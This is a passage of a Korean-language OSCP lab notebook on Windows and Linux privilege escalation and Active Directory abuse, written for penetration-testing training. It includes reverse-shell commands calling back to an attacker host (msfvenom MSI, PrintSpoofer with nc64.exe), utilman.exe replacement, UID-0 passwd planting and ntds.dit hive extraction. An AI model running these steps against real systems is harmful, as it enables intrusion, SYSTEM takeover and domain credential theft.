| `$6$` | SHA-512-crypt | `openssl passwd -6`. 현대 리눅스 기본 |

[[Twiggy]] — CentOS 7 대상이고 지원 알고리즘을 확인할 수 없는 상황에서 기본값 `$1$` 채택이 옳은 판단이었음. **강도는 여기서 무의미함**(비밀번호를 이미 알고 있음). 목적은 「그 타겟의 `crypt()` 가 해석할 수 있는 형식」 하나임.

**대안과 함정** (2026-08-26 Kali 실측):
```text
openssl passwd -1 -salt xyz <pw>          salt 고정 → 재현 가능. ★ 가장 안전한 기본 선택
mkpasswd -m sha-512 <pw>                  whois 패키지. 이 Kali 에는 설치돼 있음
python3 -c 'import crypt; ...'            ⛔ Python 3.13 에서 crypt 모듈 «제거됨» → ModuleNotFoundError
perl -e 'print crypt("<pw>","ab")'        perl 은 거의 항상 있으나 salt 2자 = 전통 DES
```
⚠️ **`python3 -c 'import crypt'` 원라이너는 최신 Kali 에서 그냥 죽음** — 오래된 치트시트가 이 형태를 싣고 있어 시험장에서 시간을 태우기 쉬움. 실측: Python 3.13.12 에서 `ModuleNotFoundError: No module named 'crypt'`.

`/etc/passwd` 에 UID 0 계정을 심는 절차 자체는 [[Access]]·[[Flu]]·[[Clue]]·[[Twiggy]] 공통임 — **UID 필드를 0 으로, 비밀번호 필드에 해시를 직접 기입**(그러면 shadow 를 참조하지 않음). 덮어쓰기 전 원본을 먼저 읽어야 하는 이유는 B-1-48.

### B-4. 윈도우 권한상승

#### B-41. AlwaysInstallElevated (Windows)

**탐지**
```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
**둘 다** `AlwaysInstallElevated REG_DWORD 0x1` 이어야 성립. PowerUp.ps1 `Invoke-AllChecks` 로도 잡힘.

**악용**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f msi > x.msi
msiexec /i x.msi
```

**출처** — OSCP 공식 보고서 템플릿 4장 예시. **PG 박스 실측은 아직 없음** — 이관 웨이브에서 해당 박스가 나오면 링크를 붙일 것.

#### B-42. 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다

`whoami /priv` 에 `SeImpersonatePrivilege` 가 없어도 포기하지 말 것 — 계정이 `LOCAL SERVICE`·`NETWORK SERVICE` 면 **원래 그 특권을 보유함.** Vista 이후의 **서비스 최소특권 모델**에서 SCM 이 서비스 기동 시 레지스트리 `RequiredPrivileges` 선언 밖의 특권을 토큰에서 제거하고, 서비스의 자식 프로세스(웹셸 등)가 그 깎인 토큰을 그대로 상속하는 것임. **계정의 특권 ≠ 프로세스 토큰의 특권.**

**FullPowers 원리** — SCM 을 우회해 같은 계정의 온전한 기본 토큰을 새로 얻음:
1. 작업 스케줄러(Task Scheduler 2.0 COM API)로 같은 계정의 예약 작업을 등록
2. **작업 스케줄러는 서비스가 아니므로 `RequiredPrivileges` 축소가 적용 안 됨** → 그 프로세스는 계정의 기본 특권 «전체»를 가진 토큰으로 뜸
3. 그 토큰을 복제(`DuplicateTokenEx`)해 `CreateProcessAsUser` 로 원하는 명령 실행
4. 예약 작업은 즉시 삭제

```text
fp.exe -c "cmd /c whoami /priv > C:\out.txt 2>&1" -z
[+] Started dummy thread with id 960
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```
[[Squid]] 실측 — 3개(`SeChangeNotify`·`SeCreateGlobal`·`SeIncreaseWorkingSet`) → **7개**, `SeImpersonatePrivilege` 포함. ⚠️ **개수가 아니라 목록에 위험 특권이 있는지로 판단할 것.**

⚠️ **출력이 안 보이면 파일로 리다이렉트할 것.** `CreateProcessAsUser` 로 만든 프로세스는 원래 콘솔과 분리돼 화면에 아무것도 안 나옴 — `-c "cmd /c <명령> > C:\out.txt 2>&1"` 로 감싸고 따로 `type` 할 것. **웹셸·예약작업·서비스·`CreateProcessAsUser` 로 만든 모든 프로세스가 같은 증상임**(A-12).

**판단 순서 — `whoami /priv` 가 빈약할 때:**
```text
whoami 가 LOCAL SERVICE / NETWORK SERVICE 인가?
  ├─ 예   → FullPowers 로 복원 시도 (1순위)
  └─ 아니오 → 서비스 오설정 · AlwaysInstallElevated(B-41) · 언쿼티드 경로(B-44)
```
**빈약한 `whoami /priv` 를 보고 바로 레지스트리를 뒤지기 시작하면 여기서 몇 시간이 날아감.**

**출처** — [[Squid]](WampServer/Apache `LOCAL SERVICE` 웹셸, 3개→7개 복원 후 PrintSpoofer 로 SYSTEM).

#### B-43. Windows Sticky Notes 는 자격증명 저장소다

**탐지** — 커널·서비스·토큰·SMB 경로가 전부 막혔을 때(A-41) 확인할 고정 위치:
```text
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
`plum.sqlite`·`plum.sqlite-wal`·`plum.sqlite-shm` 세 파일이 있을 수 있음.

**악용** — 본 DB 만 있어도 `sqlite3` 로 열면 노트 본문이 **평문**으로 나옴:
```bash
sqlite3 plum.sqlite 'select * from Note;'
```
`Note` 테이블 각 행이 노트 하나. user→admin 자격증명 피벗의 흔한 형태 — user→root 피벗으로 반복 등장할 것으로 예상.
`strings plum.sqlite` 로도 본문이 보이지만, `sqlite3 'select * from Note'` 가 행 구조를 살려 정확함.

⚠️ **`-wal` 이 있으면 같이 받을 것.** WAL 모드에서는 최신 변경이 본 DB 에 체크포인트되기 전까지 `-wal` 파일에만 있어서, 본 DB 만 열면 최신 노트를 통째로 놓칠 수 있음. [[Robust]] 는 본 DB 에 자격증명이 이미 있어 `-wal`을 받지 않았음 — 이 박스에서 `-wal` 이 실제로 필요했는지는 관측 없음.

**셸 잡은 직후 Windows 자격증명 스윕 대상**(C-2 참조) — Sticky Notes·브라우저 저장 비밀번호·`cmdkey /list`·Winlogon AutoLogon 레지스트리.

**출처** — [[Robust]](`plum.sqlite` → `Administrator:MySupersecurePassword2112` 평문, user→root).

#### B-44. unquoted service path 를 봤을 때 잴 것은 «공백»이 아니라 `icacls` 의 `(AD)`·`(IO)`

**증상** — `sc qc`/서비스 목록에 따옴표 없는 공백 경로가 보임. 반사적으로 하이재킹을 시도하게 됨.
```text
RemoteMouseService   LocalSystem   Running   Auto   C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe
```
공백에서 끊기는 후보는 `C:\Program.exe` → `C:\Program Files.exe` → `C:\Program Files (x86)\Remote.exe` 순이고, **가장 먼저 시도되는 것은 `C:\Program.exe`, 즉 C 드라이브 루트**임.

**판정은 `icacls` 로 끝남.**
```text
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
```
— 출처: `~/PG/Mice/shell443.log:893-899`

`Authenticated Users` 의 `(M)` 에 **`(IO)` = Inherit Only** 가 붙어 있음 — 상속으로 만들어질 하위 개체에만 적용되고 `C:\` 자체에는 적용되지 않음. `C:\` 에 직접 걸린 것은 `(AD)` = **디렉터리 생성만** 허용. 그래서 `C:\Program.exe` 라는 **파일**은 만들 수 없음. Windows 기본 설치의 표준 방어이고, **unquoted service path 가 실무에서 대개 안 통하는 이유가 이것임.**

→ **반사** — 경로에 공백이 있다는 사실이 아니라 **끊기는 지점의 디렉터리에 파일을 만들 수 있는가**를 잼. `C:\` 루트가 후보면 `icacls C:\` 로 `(AD)` 와 `(IO)` 를 먼저 확인할 것. `(AD)` 만 있으면 폴더는 만들어져도 exe 는 못 놓음.

**ACL 을 찾았으면 다음 명령은 «교체»가 아니라 «소유자 확인»임.** `icacls` 에서 `(M)`·`(F)` 를 봤을 때 물어야 할 것은 「바꿀 수 있나」가 아니라 **「바꾸면 누가 실행하나」**임. 순서:
```powershell
icacls <경로>
Get-CimInstance Win32_Service | select Name,StartName,State,PathName   # 서비스인가, 어느 계정인가
Get-WmiObject Win32_Process … GetOwner()                               # 지금 누가 돌리고 있나
```
서비스도 아니고 지금 도는 것도 나라면 그 ACL 은 **아직 승리 조건이 아니라 절반짜리 리드**임. 버리지도 말고 다 이겼다고 생각하지도 말 것 — **트리거를 찾는 것이 남은 일의 전부**가 됨.

⚠️ 서비스 목록을 `Name,State,PathName` 으로만 찍으면 「쓰기 가능한가」만 묻게 됨 — **`StartName`(실행 계정)을 같이 찍어야** 위 질문이 성립함. [[Monster]] 는 이것을 빠뜨렸고, 그 교훈을 `~/PG/_lib/harvest.ps1` 에 반영했음.
⚠️ **`[가정]` 다만 이 습관이 항상 답을 주지는 않음** — [[Monster]] 는 XAMPP 가 애초에 **서비스로 등록된 적이 없어**(`Win32_Service` 빈 결과 · `sc.exe qc mysql` → 1060) `StartName` 을 봤어도 못 잡았을 리드였음. 「`StartName` 을 빼먹어서 XAMPP 를 놓쳤다」는 **틀린 복기**임 — 놓친 XAMPP 서비스라는 것이 존재하지 않았음(B-2-12).

**출처** — [[Mice]](EDB 50258 배제 근거) · [[Monster]](`StartName` 습관).


**`StartName` 이 권한상승의 «유무»를 결정함 — 익스플로잇 «전»에 알 수 있음.** [[Algernon]] 은 셸을 잡자마자 친 한 줄로 권한상승 장이 통째로 사라졌음:
```text
Name      : MailService
StartName : LocalSystem
State     : Running
PathName  : "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService
.exe"
```
— 출처: `~/PG/Algernon/shell_session.log`

| `StartName` | 익스플로잇하면 무엇을 얻는가 | 다음 수 |
|---|---|---|
| `LocalSystem` | `NT AUTHORITY\SYSTEM` | 끝. 권한상승 불필요 |
| `NT AUTHORITY\LocalService` | `LOCAL SERVICE` — 특권이 «박탈된» 상태 | FullPowers 로 복원 → PrintSpoofer/Potato(B-42 · B-46) |
| `NT AUTHORITY\NetworkService` | `NETWORK SERVICE` | 동일. `SeImpersonatePrivilege` 확인 |
| `IIS APPPOOL\<pool>` | 앱풀 아이덴티티 | 동일. `whoami /priv` |
| 도메인/로컬 사용자 계정 | 그 사용자 | 서비스 계정의 평문 비밀번호가 레지스트리에 있을 수 있음 |

→ **서비스 취약점을 찌르기 «전»에 그 서비스의 `StartName` 을 확인하면 「셸을 잡으면 무엇이 되는가」를 미리 앎.** B-1-40(관리 화면이 렌더한 «경로»가 실행 계정을 말해준다)의 서비스 판임.
→ `PathName` 이 따옴표로 감싸져 있으면 unquoted 벡터는 애초에 해당 없음 — [[Algernon]] 이 그 예임.

#### B-45. GUI 파일 대화상자 → 상위 권한 cmd

**신호** — SYSTEM/관리자 권한으로 도는 앱이 **파일 대화상자**(저장·열기·찾아보기 어디든)를 띄울 수 있음. [[Mice]] 는 Remote Mouse 3.008 의 `Image Transfer Folder` → `Change...`(CVE-2021-35448 / EDB 50047).

**절차** — 대화상자의 **주소창(브레드크럼)** 을 클릭해 편집 모드로 만들고 `C:\Windows\System32\cmd.exe` 입력 → Enter. 탐색기가 그것을 「이동할 위치」로 해석하고, 대상이 실행 파일이면 **실행**함.

⚠️ **「파일 이름」 칸이 아님.** 그 칸은 저장 대상 파일명을 받으므로 **저장 시도로 처리되고 셸이 안 뜸.** [[Mice]] 실측 — `File name` 칸에 `Save Here` 가 들어간 상태였고(`파일보관\PG-Mice-system-saveas-dialog.png`), **주소창으로 옮긴 뒤에야** `Administrator: C:\Windows\System32\cmd.exe` 창이 떴음.

**대화상자가 상위 권한인지 알아보는 신호** — 열자마자 `C:\WINDOWS\system32\config\systemprofile\Desktop is unavailable` 오류가 함께 뜨면 그 대화상자는 **SYSTEM 프로필에서 돎.** 일반 사용자 프로세스는 그 경로를 홈으로 삼지 않음.

**왜 SYSTEM 이 되는가 — 프로세스 트리로 확인.** 서비스(LocalSystem)가 GUI 를 **자식으로** 사용자 세션에 띄우면 Session 0 격리 우회임:
```powershell
Name            : RemoteMouseService.exe
ProcessId       : 2284
SessionId       : 0

Name            : RemoteMouse.exe
ProcessId       : 2640
ParentProcessId : 2284
SessionId       : 1
```

**부수 신호** — `Get-CimInstance Win32_Process` 의 `GetOwner` 가 Domain/User 를 **빈 문자열**로 돌려주면(`Owner=\`) 소유자가 없어서가 아니라 **내 권한으로는 조회할 수 없는 프로세스**라는 뜻임. 그 자체가 상위 권한 프로세스라는 신호.

**전제** — GUI 클릭이 필요하므로 RDP/VNC 진입이 선행돼야 함. 트레이 아이콘이 안 보이면 A-48, `Start-Process` 가 거절되면 A-49.

**출처** — [[Mice]](CVE-2021-35448).

#### B-46. `SeImpersonatePrivilege : Enabled` + Spooler 생존 → PrintSpoofer

**셸을 잡으면(특히 서비스 계정) `whoami /priv` 부터.** `SeImpersonatePrivilege : Enabled` 는 서비스 계정에 거의 항상 붙어 있고 곧바로 Potato 계열(PrintSpoofer·GodPotato·JuicyPotatoNG)이 통한다는 신호임.

[[Nagoya]] 실측 — `xp_cmdshell whoami /priv` 로 `svc_mssql` 컨텍스트에서 확인. PrintSpoofer64.exe·nc64.exe 를 `C:\programdata\`(모든 계정 쓰기 가능, 대개 감시 느슨)에 `iwr` 로 업로드:
```text
xp_cmdshell C:\programdata\ps.exe -c "C:\programdata\nc64.exe <LHOST> <PORT> -e cmd.exe"
```
⚠️ **`iwr` 은 성공 시 아무것도 안 뱉음** — PowerShell 출력 `NULL` 이 성공이고, **예외 텍스트가 나오면 실패**임(A-12 「응답이 성공을 뜻하지 않는다」의 반대 방향).

**실행 로그 3줄이 각 단계임:**
```text
[+] Found privilege: SeImpersonatePrivilege     ← 권한 확인
[+] Named pipe listening...                     ← 명명 파이프 대기
[+] CreateProcessAsUser() OK                    ← 스풀러가 그 파이프에 붙어와 사칭돼 새 프로세스 생성
```
어느 줄에서 멈췄는지가 곧 실패 계층임 — 1줄에서 멈추면 특권 부재, 2줄에서 멈추면 **Spooler 가 꺼져 있는 것**(그때는 GodPotato·JuicyPotatoNG 로 교체).

⚠️ **DC 에서는 결과가 `nt authority\system` 이 아니라 `DOMAIN\HOST$` 로 나올 수 있음 — 실패가 아님**(A-53).

**Potato 계열은 «빌드»로 먼저 걸러질 것.** 원리는 전부 같고 ②단계(누구를 어떻게 속이는가)만 다름:

| 이름 | 유인 방법 | Server 2019 / Win10 1809 (build 17763)+ |
|---|---|---|
| Hot Potato | NBNS 스푸핑 + WPAD + NTLM 릴레이 | ❌ 구버전 전용 |
| RottenPotato · JuicyPotato | DCOM OXID 리졸버를 임의 로컬 포트로 유도 | ❌ **죽음** — 1809 부터 OXID 를 135 외 포트로 질의 불가라 `-l <port>` 가 막힘 |
| RoguePotato | OXID 리졸버를 외부 135 릴레이로 우회 | ✅ 단 **아웃바운드 135 필요** |
| **PrintSpoofer** | Spooler RPC 로 `spoolsv.exe`(SYSTEM)를 명명 파이프에 유인 | ✅ Spooler 가동 중이면 |
| EfsPotato · GodPotato | EFSRPC(`lsarpc`)·DCOM 범용 변형 | ✅ **Spooler 가 꺼져 있어도 됨** |

→ **build 17763 을 확인하는 즉시 JuicyPotato 를 배제하고 PrintSpoofer → EfsPotato/GodPotato → RoguePotato 순으로 갈 것.** 빌드는 `systeminfo` 가 막혀도 비특권 경로로 확인 가능함 — [[Squid]] 는 phpSysInfo 가 렌더한 `Kernel="10.0.17763"` 로 확정했음(B-1-40 · A-1).

**방어** — DC 에서 Print Spooler 를 끔. PrintSpoofer 와 PrinterBug 를 동시에 막음.

**출처** — [[Nagoya]](xp_cmdshell 경유) · [[Squid]](웹셸 경유, build 17763 확인 후 PrintSpoofer 직행).

⛔ **방어 쪽에서 「최신 패치 유지」는 대책이 아님.** Microsoft 는 서비스 계정 → SYSTEM 임퍼소네이션을 **설계상 동작**으로 취급하며 PrintSpoofer·EfsPotato·GodPotato 는 패치로 막히지 않음(Server 2019 에서 정상 동작). 실제로 죽은 것은 JuicyPotato 하나이고 그것도 OXID 리졸버 변경의 부산물임.
실효 있는 조치는 셋 — 서비스의 `RequiredPrivileges` 에서 해당 특권 제거 · Spooler 서비스 비활성화(PrintSpoofer 차단) · 탐지 보완(예약 작업 생성 이벤트 4698, 비정상 명명 파이프 생성 모니터링). **근본 대책은 애초에 앱풀·서비스에 특권 신원을 주지 않는 것**(`ApplicationPoolIdentity`).
⚠️ 이 문단은 [[Butch]] 에서 **관측된 것이 아님** — 그 박스의 앱풀은 이미 `nt authority\system` 이라 `SeImpersonatePrivilege` 를 쓸 일이 없었음. **일반 지식으로 읽을 것.**

#### B-47. SeRestorePrivilege — SYSTEM 으로 가는 두 갈래(파일 / 레지스트리)와 그 전제조건

**무엇인가.** 설계 의도는 「백업 소프트웨어가 복원할 때 파일 DACL 을 무시하고 덮어쓸 수 있게」 하는 것. 그 결과 보유자는 **`%SystemRoot%\System32` 같은 ACL 보호 위치에도 쓰기·삭제·이름변경이 가능**해지고, `HKLM` 보호 키에 대해서도 같은 성질을 갖는다.

| 경로 | 건드리는 객체 | SYSTEM 이 되는 이유 |
|---|---|---|
| **A. `utilman.exe` 치환** | 파일 `C:\Windows\System32\utilman.exe` | RDP 로그인 화면의 접근성 버튼은 **로그온 전**이라 `NT AUTHORITY\SYSTEM` 으로 실행된다. 그 실행 파일을 `cmd.exe` 로 바꿔치기하면 로그인 화면에서 SYSTEM 콘솔이 열린다 |
| **B. `SeRestoreAbuse.exe`** | 레지스트리(서비스 설정 키) | 서비스의 실행 경로를 내 페이로드로 바꾸고 그 서비스를 시작시킨다. 서비스는 LocalSystem 으로 뜬다 |

**⛔ 경로 A 의 숨은 전제조건 — NLA 가 꺼져 있어야 한다.**
`utilman` 트릭은 로그인 «화면»에 도달해야 성립한다. NLA(Network Level Authentication)가 켜져 있으면 화면이 그려지기 전에 자격증명을 요구하므로 Win+U 를 누를 화면 자체가 없다. **nmap·nxc 가 이미 답을 준다:**
```text
RDP  192.168.120.165  3389  DC01  [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:heist.offsec) (nla:False)
```
**`nla:True` 면 경로 A 는 버리고 경로 B 로 간다.** 이 한 글자를 확인하지 않고 utilman 을 갈아엎으면 시스템 파일만 망가뜨리고 끝난다.

**경로 A 실행 — 순서가 중요하다.** 원본을 먼저 치워야 이름 충돌 없이 `cmd.exe` 를 그 자리에 놓을 수 있다.
```powershell
ren utilman.exe utilman.old
ren cmd.exe Utilman.exe
```
오류 없이 두 줄이 통과했다는 것 자체가 **`SeRestorePrivilege` 가 DACL 을 우회했다는 증거**다 — 일반 사용자는 `System32` 에 이름변경을 못 한다.
`xfreerdp3 /v:<IP> /cert:ignore /sec:tls` 로 **자격증명 없이** 붙는다. `/sec:tls` 를 빼면 NLA 협상으로 빠져 자격증명을 먼저 요구해 로그인 화면에 도달하지 못한다.
⚠️ **끝나면 되돌릴 것** — `ren Utilman.exe cmd.exe` → `ren utilman.old utilman.exe`. 시험은 리버트 후 재현을 요구하므로 원복 절차까지가 한 세트다.
⚠️ **이름을 바꾼 `cmd.exe` 는 배너 자리에 오류 문구를 뱉는다** — `The system cannot find message text for message number 0x2350 in the message file for Application.` · `Not enough memory resources are available to process this command.` 자기 메시지 리소스를 자기 파일명으로 못 찾아 생기는 표시로 보임 `[가정]`. **셸 자체는 정상 동작한다** — 같은 화면의 `whoami` 가 `nt authority\system` 이었다([[Heist]], 출처 `파일보관\Pasted image 20260708153113.png`). **오류로 보고 경로를 접지 말 것.**

**경로 B 실행.** `SeRestoreAbuse.exe "<명령>"` → `RegCreateKeyExA result: 0` / `RegSetValueExA result: 0` (Win32 에서 **0 = `ERROR_SUCCESS`**). 함께 찍히는 `Start-Service seclogon` 은 다음에 칠 명령을 알려주는 안내 문자열 — 이 도구는 `seclogon`(Secondary Logon) 서비스 실행 경로를 바꿔놓고 그 서비스를 시작하라고 요구한다.
⚠️ Kali 에는 컴파일된 `.exe` 만 있고 소스가 없어(`~/git/SeRestoreAbuse/SeRestoreAbuse.exe`) **어느 레지스트리 키를 정확히 쓰는지는 확인하지 못했음** `[가정]`.

**두 경로 우열 — 시험이라면 A 를 먼저.**

| | A: utilman + RDP | B: SeRestoreAbuse + nc |
|---|---|---|
| 전제조건 | `nla:False` · 3389 열림 | 없음 (WinRM 만 있으면 됨) |
| 업로드 | 없음 | 2개 — AV 위험 |
| 남기는 흔적 | 시스템 파일 2개 이름변경 — 원복 필수 | 서비스 설정 변경 — 원복 권장 |
| 셸 품질 | GUI 콘솔(붙여넣기 불편) | `rlwrap` 리버스셸 — 스크립트하기 좋음 |
| 안정성 | 화면 조작이라 실패해도 즉시 앎 | 서비스 시작 타이밍에 의존 |

**변형 — 같은 부류로 읽을 것.** `SeRestore` 대신 `SeBackup`(`ntds.dit` + `SYSTEM` 하이브 → `secretsdump`, [[Vault]])·`SeTakeOwnership`(소유권 탈취 → DACL 재작성). **특권 이름 하나가 곧 경로다.**

**`whoami /priv` 특권 → 경로 대응표**

| 특권 | 경로 | 참고 |
|---|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer / GodPotato / SweetPotato | [[Squid]] · B-46 |
| `SeRestorePrivilege` | `utilman.exe` 치환 · 서비스 레지스트리 하이재킹 | [[Heist]] · [[Vault]] |
| `SeBackupPrivilege` | `ntds.dit` + `SYSTEM` 하이브 → `secretsdump` | [[Vault]] |
| `SeTakeOwnershipPrivilege` | 대상 파일 소유권 탈취 → DACL 재작성 | |
| `SeDebugPrivilege` | lsass 덤프 → mimikatz | |
| `SeLoadDriverPrivilege` | 취약 드라이버 로드 | |
| 아무것도 없음 | 서비스 오설정·AlwaysInstallElevated·자동로그온 레지스트리로 방향 전환 | B-41 · B-42 |

#### B-48. `SeDebugPrivilege` 는 그 자체로 SYSTEM 상승 경로다

**`whoami /priv` 목록에 이름이 «있으면» 쓸 수 있음.** `State: Disabled` 는 「쓸 수 없다」가 아니라 「토큰에 존재하되 비활성」이고 `AdjustTokenPrivileges` 로 스스로 켤 수 있음. **진짜 없는 권한은 행 자체가 없음**(예: `SeImpersonatePrivilege` 부재 → Potato 계열 전면 배제).

**메커니즘** — `SeDebugPrivilege` 는 `OpenProcess` 호출 시 **대상 프로세스의 DACL 검사를 통째로 우회**하도록 설계된 권한임(디버거가 임의 프로세스에 붙을 수 있어야 하므로).
1. SYSTEM 무결성으로 도는 프로세스의 PID 를 찾음 — 주로 `winlogon.exe`(항상 존재, 세션 1, `lsass.exe` 와 달리 **PPL 보호가 없음**)
2. `OpenProcess(PROCESS_ALL_ACCESS)` — 권한 덕분에 DACL 을 무시하고 성공
3. 그 핸들을 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` 로 넘겨 `CreateProcess` 호출
4. 새 프로세스가 대상의 자식이 되며 **부모(SYSTEM) 토큰을 상속**

PoC — `https://github.com/r4j3sh-com/SeDebugPrivilegePoC`(출처: `~/PG/Osaka/SeDebugPrivilegePoC/`).
```text
.\PoC.exe "<절대경로> <인자>"
```
⚠️ **명령 «전체»를 큰따옴표 하나로 감쌀 것** — 안 감싸면 PoC 가 첫 토큰만 명령으로 받음.
⚠️ **절대 경로 필수** — 새 프로세스는 winlogon 의 자식이라 작업 디렉터리가 우리 셸과 다를 수 있음.

대안은 lsass 덤프 → mimikatz 이고, 다른 특권과의 대응은 B-47 의 「`whoami /priv` 특권 → 경로 대응표」에 정리돼 있음.
→ **Windows 권한상승 열거 순서** — `whoami /priv`(**1번, 가장 빠른 승부처**) → `whoami /groups` → AlwaysInstallElevated(B-41) → 서비스·언쿼티드 경로(B-44) → 스케줄 작업 → 저장된 자격증명(`cmdkey`·`unattend.xml`, B-64) → 패치 수준(커널 익스플로잇은 최후 수단). **1번에서 끝나는 박스가 놀랄 만큼 많음**(C-2).

### B-5. Active Directory

#### B-51. «사용자 설명 필드»는 AD 의 자격증명 저장소다

`description`·`info`·`comment` 를 **가장 먼저** 전수 조회할 것. 익명으로 읽히는 도메인이 실제로 있음.

- [[Resourced]] — SMB 널 세션, `Pre-Windows 2000 Compatible Access` 에 `ANONYMOUS LOGON` 포함
- [[Hutch]] — 익명 LDAP 서브트리 조회

⚠️ **`ldapsearch` 는 `-o ldif_wrap=no` 없이 쓰면 긴 값이 잘려 비밀번호를 통째로 놓침.**

#### B-52. 실패 표시가 실패를 뜻하지 않는다 — NTLM 상태 코드를 읽는다

`STATUS_PASSWORD_EXPIRED`·`MUST_CHANGE`·`ACCOUNT_RESTRICTION` 은 **«자격증명이 맞다»는 증거**임. ([[Resourced]] — 만료되지 않은 두 계정만 통과했고, 그 둘이 `pwdneverexpires=true` 임이 BloodHound 덤프로 확인됐음)

⚠️ **`-u 파일 -p/-H 파일` 은 기본이 «전조합 스프레이»임** — `--no-bruteforce` 를 빼면 계정을 잠금. ([[Hutch]] — 196회를 뿌렸고 잠금 정책이 없어서 살았음)

#### B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다

**«내 계정의 아웃바운드 엣지»를 직접 볼 것.** Shortest Path 쿼리는 정답 엣지를 놓침.

- [[Resourced]] — 돌릴 수 있게 된 시점보다 **3시간 50분** 늦게 돌렸음
- [[Hutch]] — 데이터는 13:23 에 있었는데 `ReadLAPSPassword` 엣지는 **65분 뒤** 14:28 에 봤고, 본 뒤에는 **24분 만에** 끝났음

**«2홉» 사슬은 사람이 LDAP 을 눈으로 훑어서는 못 찾음.** [[Nagoya]] — craig.carr 하나로 시작해 EMPLOYEES →`GenericAll`→ iain.white(HELPDESK) →`GenericAll`→ christopher.lewis(DEVELOPERS, **Remote Management Users 의 유일 멤버 그룹**)를 수집 JSON 으로 확정했음.
- **왜 2홉인가** — craig.carr 는 EMPLOYEES 소속이라 iain.white 는 건드릴 수 있으나 christopher.lewis 는 못 건드림. christopher.lewis 를 통제하는 것은 HELPDESK 인데 craig.carr 는 HELPDESK 가 아님. **iain.white 가 HELPDESK 멤버라 경유지가 됨**
- **왜 하필 christopher.lewis 인가** — EMPLOYEES·HELPDESK 가 손댈 수 있는 계정 중 DEVELOPERS 소속은 그 하나뿐이었음(나머지 DEVELOPERS 멤버는 ACCOUNT OPERATORS 만 통제). **셸이 되는 계정은 하나였음**
- HELPDESK 의 `GenericAll` 대상 21명이 EMPLOYEES 멤버 21명과 **정확히 같은 집합**이라는 것도 **ACE 개수를 세어야 나오는 값**이라 육안 열거로는 못 봄(`20260706153247_users.json`)

→ **찾는 것은 「내 계정의 아웃바운드 엣지」이고, 그 끝점이 «로그인 가능한 그룹»에 닿는가**임. Remote Management Users·Administrators 멤버십이 목적지 판정 기준임.

**한 계정으로 가는 SYSTEM 경로가 «셋»일 수 있음 — `whoami /priv` 와 그래프가 갈림길임.** 셸을 잡은 첫 1분에 두 명령이 권한상승 방향을 결정함 — `whoami /priv`(특권 축)와 BloodHound 아웃바운드 엣지(ACL 축).

| 이러면 | 다음 수 |
|---|---|
| 특권이 4개뿐이고 `SeImpersonate`·`SeBackup` 둘 다 없음 | **그래프의 ACL 엣지**를 봄. 특권만으로는 길이 없음([[Heist]] 형) |
| `SeBackup`·`SeRestore` 가 있음 | 그 자리에서 끝남. 그래프를 볼 필요도 없음([[Vault]] 형) |
| 그래프에 **GPO** `GenericWrite`·`WriteDacl` | SharpGPOAbuse(B-58) |
| 그래프에 **사용자·그룹 객체** `GenericAll` | 비밀번호 리셋(`net rpc password`) · Shadow Credentials |

**`SeBackupPrivilege`·`SeRestorePrivilege` 는 대개 «그룹 멤버십»에서 옴.** `Server Operators`·`Backup Operators`·`Print Operators` 는 **BloodHound 가 기본으로 High Value 로 칠하지 않을 수 있음** — `Domain Admins` 만 빨갛게 보고 넘기면 이미 관리자급인 계정을 놓침. **사람 계정이 이 세 그룹 중 하나에 있으면 그 자체로 DC 장악 경로임.**
⚠️ 같은 특권이라도 **부여 경로가 다르면 그래프에 보이거나 안 보임** — [[Heist]] 의 `svc_apache$` 는 URA(User Rights Assignment)로 직접 받아 그래프에 없었고, [[Vault]] 의 `anirudh` 는 그룹 멤버십이라 그래프에 있었음. **그래프에 없다고 특권이 없는 것이 아님.**

**세 경로 우열**([[Vault]] 에서 GPO·SeRestore 두 경로를 실제로 **완주**했고 SeBackup 은 DLL 준비까지):

| | GPO ACL | SeRestore(utilman) | SeBackup(`ntds.dit`) |
|---|---|---|---|
| 업로드 | `.exe` 1개 | 없음 | DLL 2개 또는 없음(diskshadow) |
| 얻는 것 | 그 DC 의 로컬 관리자 | 그 DC 의 SYSTEM | **도메인 전체 해시**(`krbtgt` 포함) |
| 전제조건 | 없음 | **RDP `nla:False`** | 없음 |
| 남는 흔적 | GPO Restricted Groups 변경 | `System32` 바이너리 치환 | 임시 파일·섀도카피 |
| 시험 가치 | 중간 | 낮음 | **가장 높음** — 골든티켓·크로스호스트 PtH 로 확장 |

**「`GetChanges` ACE 가 없다」가 「도메인 해시를 못 얻는다」는 뜻이 아님.** DCSync(DRSUAPI 복제)는 한 방법일 뿐이고 `SeBackupPrivilege` 로 `ntds.dit` 를 직접 읽거나 DC 에서 로컬 관리자·SYSTEM 이 되면 같은 곳에 도달함.
⚠️ [[Vault]] 에서 도메인 객체의 `GetChanges`·`GetChangesAll` 은 기본 principal 뿐이었으나 **`BUILTIN\Administrators`(S-1-5-32-544)가 둘 다 가짐** — GPO 로 그 그룹에 들어가면 DCSync 도 성립함(그 박스에서 시도하지는 않았음).

**`SeBackupPrivilege` → `ntds.dit` 절차**(라이브 파일이라 일반 복사 실패):
```powershell
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
reg save hklm\system C:\temp\system.hive
```
